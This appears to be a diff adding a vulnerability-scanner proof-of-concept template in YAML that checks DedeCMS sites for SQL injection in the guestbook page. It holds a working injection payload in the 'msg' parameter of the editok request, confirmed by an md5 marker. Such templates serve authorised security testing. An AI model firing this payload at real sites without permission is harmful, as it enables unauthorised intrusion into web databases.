@@ -1,0 +1,43 @@
+id: poc-yaml-dedecms-guestbook-sqli
+info:
+  name: Dedecms Guestbook SQL注入漏洞
+  severity: medium
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: DedeCMS
+  reference: []
+  description: null
+variables:
+  r: random_int(10000, 21000)
+transport: http
+requests:
+- method: GET
+  path: /plus/guestbook.php
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200
+  output:
+  - regex_match(body,"action=admin&id=(?P<articleid>\\d{1,20})")
+- method: GET
+  path: /plus/guestbook.php?action=admin&job=editok&id={{.articleid}}&msg=',msg=@`'`,msg=(selecT
+    md5({{.r}})),email='
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200
+  output: []
+- method: GET
+  path: /plus/guestbook.php
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, md5(r))
+  output: []
